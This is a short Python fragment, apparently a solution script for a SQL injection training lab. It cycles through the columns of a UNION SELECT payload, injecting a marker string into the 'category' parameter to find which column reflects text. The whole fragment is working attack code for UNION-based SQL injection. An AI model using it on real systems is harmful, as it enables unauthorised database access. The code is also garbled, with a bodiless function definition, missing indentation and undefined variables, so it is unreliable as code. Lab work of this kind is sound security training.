def sqli_union_2_lab(response, null):...
step = null.index('NULL')
column = 0
while not response.ok:
index = null.index('NULL', step)
print(f'Column {column} contains inserted text')
step = index + 1
column += 1
null[index] = "'VULNERABLE_STRING'"
sqli['category'] = f"Lifestyle{' '.join(null)}"
response = api_session.get(url, params=sqli)
null[index] = 'NULL'
